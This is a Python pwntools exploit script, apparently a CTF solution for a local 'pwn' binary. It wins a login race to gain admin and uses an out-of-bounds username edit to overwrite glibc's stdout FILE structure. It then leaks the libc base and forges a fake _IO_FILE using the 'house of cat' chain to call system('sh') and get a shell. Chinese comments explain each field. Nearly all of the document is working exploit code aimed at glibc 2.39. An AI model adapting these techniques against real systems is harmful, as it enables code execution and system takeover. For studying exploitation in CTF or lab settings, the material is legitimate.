#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['/mnt/c/Users/H/AppData/Local/Microsoft/WindowsApps/wt.exe', 'wsl']

filename = "pwn"
libcname = "/home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6_2.39-0ubuntu8.6_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 57986
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/libc6-dbg_2.39-0ubuntu8.6_amd64/usr/lib/debug
set directories /home/r3t2/.config/cpwn/pkgs/2.39-0ubuntu8.6/amd64/glibc-source_2.39-0ubuntu8.6_all/usr/src/glibc/glibc-2.39
'''

def start():
    if args.P:
        return process(elf.path)
    elif args.R:
        return remote(host, port)
    else:
        return gdb.debug(elf.path, gdbscript = gs)


io = start()

# pwn :)
def login(username, password):
    io.sendline(b'2')
    #io.recvuntil(b'username: ')
    io.sendline(username)
    #io.recvuntil(b'password: ')
    io.sendline(password)


def register(username, password):
    io.sendline(b'1')
    io.recvuntil(b'username: ')
    io.sendline(username)
    io.recvuntil(b'password: ')
    io.sendline(password)

def edit_username(idx, username):
    io.sendline(b'1')
    io.recvuntil(b'user index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'username: ')
    io.sendline(username)
    #gdb.attach(io)

def try_get_admin():
    io.recvuntil(b'> ')
    recv = b""

    register(b'r3t2', b'r3t2')
    io.recvuntil(b'[+] registered:')

    for round_id in range(1, 101):
        for _ in range(1000):
            login(b'admin', b'r3t2')
            login(b'r3t2', b'r3t2')

        recv += io.recvrepeat(0.25)
        if b"[+] logged in as admin" not in recv:
            recv = b""
            continue
        else:
            return True
    return False

if try_get_admin():
    log.success("logged in as admin now")
    io.sendline(b'8')
    io.recvuntil(b'username: ')
    io.sendline(b'admin')

    io.recvuntil(b'> ')
    io.sendline(b'6')
    io.recvuntil(b'> ')

    edit_username(-3, p64(0xfbad1800) + p64(0)*3 + b'\x28')
    libc_base = u64(io.recv(8)) - libc.sym["_IO_2_1_stdin_"]
    log.success("libc_base --> "+hex(libc_base))
    io.recvuntil(b'> ')

    stdout = libc_base + libc.sym["_IO_2_1_stdout_"]
    fake_IO_addr = stdout
    fake_IO = b'sh\x00' # _flags
    fake_IO = fake_IO.ljust(0x28, b'\x00') + p64(fake_IO_addr + 0x110) # 此时会向 _IO_write_ptr 写数据，所以填充为一个可写地址 （根据我们布局此时fp->_IO_write_ptr和fp->_wide_data->_IO_write_base重合了）
    fake_IO = fake_IO.ljust(0x10 + 0x20, b'\x00') + p64(fake_IO_addr + 0x120) # rdx = [rax+0x20] / _wide_data->_IO_write_ptr 此处我们不需要控制rdx，设置一个值满足大于_wide_data->_IO_write_base 即可
    fake_IO = fake_IO.ljust(0x40 + 0x18, b'\x00') + p64(libc_base + libc.sym["system"]) # _wide_data->_wide_vtable->_IO_WOVERFLOW
    fake_IO = fake_IO.ljust(0x68, b'\x00') + p64(0) # _chain
    fake_IO = fake_IO.ljust(0x88, b'\x00') + p64(libc_base + 0x205710) # _lock 这里必须恢复其正常原值, 不然会一直阻塞
    fake_IO = fake_IO.ljust(0xa0, b'\x00') + p64(fake_IO_addr + 0x10) # _wida_data
    fake_IO = fake_IO.ljust(0xc0, b'\x00') + p32(0xffffffff) # _mode = -1 , 在这里 -1 0 1 都满足条件
    fake_IO = fake_IO.ljust(0xd8, b'\x00') + p64(libc_base + libc.sym["_IO_wfile_jumps"] + 0x10) # vtable 偏移一下，使其调用的overflow变为_IO_wfile_seekoff
    fake_IO = fake_IO.ljust(0x10 + 0xe0, b'\x00') + p64(fake_IO_addr + 0x40) # _wida_data->_wide_vtable
    # pause()
    # gdb.attach(io)
    # pause()
    edit_username(-3, fake_IO)  # stdout

    # 此时 根据 house of cat调用链，我们此时 rcx = 0
# off64_t
# _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)
# {
#   off64_t result;
#   off64_t delta, new_offset;
#   long int count;

#   /* Short-circuit into a separate function.  We don't want to mix any
#      functionality and we don't want to touch anything inside the FILE
#      object. */
#   if (mode == 0)
#     return do_ftell_wide (fp);

#   /* POSIX.1 8.2.3.7 says that after a call the fflush() the file
#      offset of the underlying file must be exact.  */
#   int must_be_exact = ((fp->_wide_data->_IO_read_base
# 			== fp->_wide_data->_IO_read_end)
# 		       && (fp->_wide_data->_IO_write_base
# 			   == fp->_wide_data->_IO_write_ptr));

#   bool was_writing = ((fp->_wide_data->_IO_write_ptr
# 		       > fp->_wide_data->_IO_write_base)
# 		      || _IO_in_put_mode (fp));

#   /* Flush unwritten characters.
#      (This may do an unneeded write if we seek within the buffer.
#      But to be able to switch to reading, we would need to set
#      egptr to pptr.  That can't be done in the current design,
#      which assumes file_ptr() is eGptr.  Anyway, since we probably
#      end up flushing when we close(), it doesn't make much difference.)
#      FIXME: simulate mem-mapped files. */
#   if (was_writing && _IO_switch_to_wget_mode (fp))
#     return WEOF;
#   ...
# }
# libc_hidden_def (_IO_wfile_seekoff)

    # 此时 mode == 0 (第四个参数是 rcx), 无法走到预期的_IO_switch_to_wget_mode
    # 但是调试发现我们的输入会改变 rcx, 并且我们改写 stdout 后程序也不会崩溃只是输出坏了
    # 所以我们可以正常输入，输入一个非 0 值，但注意不要进入admin_menu的正常选项, 触发无效选项的提示输出即可
    io.sendline(b'5')
    # 现在就已经getshell了
    io.interactive()
else:
    io.close()
